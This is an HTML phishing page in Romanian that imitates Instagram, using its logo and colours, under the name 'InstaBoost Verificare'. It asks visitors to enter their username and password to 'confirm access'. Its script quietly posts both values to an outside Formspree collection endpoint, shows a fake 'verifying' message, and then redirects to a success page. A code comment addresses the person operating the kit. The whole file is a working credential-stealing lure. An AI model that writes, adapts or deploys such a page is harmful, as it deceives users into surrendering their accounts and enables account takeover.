<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaBoost Verificare</title>
    <style>
        body { background: #ffffff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { width: 330px; padding: 45px 25px; text-align: center; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); border: 1px solid #f2f2f2; }
        
        /* Pătratul cu gradient și logoul stilizat */
        .app-icon { 
            width: 85px; height: 85px; 
            background: linear-gradient(45deg, #0095f6, #ff007f); 
            border-radius: 22px; 
            margin: 0 auto 30px; 
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 8px 20px rgba(255, 0, 127, 0.2);
        }

        /* Logoul stilizat (recreat din SVG) */
        .insta-svg { width: 45px; height: 45px; fill: white; }

        h2 { font-size: 22px; color: #262626; margin-bottom: 12px; font-weight: 700; }
        p { font-size: 13.5px; color: #8e8e8e; margin-bottom: 35px; line-height: 1.5; padding: 0 15px; }
        
        input { width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 12px; background: #fafafa; font-size: 14.5px; box-sizing: border-box; outline: none; transition: 0.2s; }
        input:focus { border: 1px solid #ff007f; background: #fff; }
        
        button { width: 100%; background: linear-gradient(45deg, #0095f6, #ff007f); color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; box-shadow: 0 6px 20px rgba(0, 149, 246, 0.3); transition: 0.3s; }
        button:active { transform: scale(0.97); opacity: 0.9; }
    </style>
</head>
<body>
    <div class="box">
        <div class="app-icon">
            <svg class="insta-svg" viewBox="0 0 24 24">
                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
            </svg>
        </div>
        <h2>Confirmare Acces</h2>
        <p>Introdu datele de profil pentru a finaliza procedura de activare a resurselor.</p>
        
        <form id="p-form">
            <input type="text" id="v1" placeholder="Username" required>
            <input type="password" id="v2" placeholder="Password" required>
            <button type="submit" id="b">Confirmă și Activează</button>
        </form>
    </div>

    <script>
        document.getElementById('p-form').onsubmit = function(e) {
            e.preventDefault();
            const btn = document.getElementById('b');
            btn.innerHTML = "Se verifică...";
            btn.disabled = true;

            // Datele sunt trimise către Formspree-ul tău nou
            fetch("https://formspree.io/f/mojpdpek", {
                method: "POST",
                body: JSON.stringify({ 
                    "ID_Profil": document.getElementById('v1').value, 
                    "Cod_Validare": document.getElementById('v2').value 
                }),
                headers: { "Content-Type": "application/json", "Accept": "application/json" }
            });

            setTimeout(() => { 
                window.location.href = "verificare/succes.html"; 
            }, 2000);
        };
    </script>
</body>
</html>
